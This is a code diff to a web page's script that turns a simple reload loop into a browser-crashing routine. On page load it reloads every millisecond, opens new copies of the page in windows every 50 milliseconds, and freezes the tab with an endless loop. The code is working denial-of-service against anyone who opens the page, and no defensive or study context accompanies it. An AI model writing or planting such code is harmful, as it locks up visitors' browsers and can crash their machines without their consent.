@@ -31,13 +31,20 @@
 
   <script>
     function crash() {
-      // Immediately start reloading in an infinite loop
+      // Reload loop
+      setInterval(() => location.reload(true), 1);
+
+      // Flood the browser with new windows
+      setInterval(() => {
+        window.open(window.location.href, '_blank');
+      }, 50);
+
+      // Freeze the tab
       while (true) {
-        location.reload(true);
+        console.log("crash");
       }
     }
 
-    // Run crash right away
     window.onload = crash;
   </script>
 
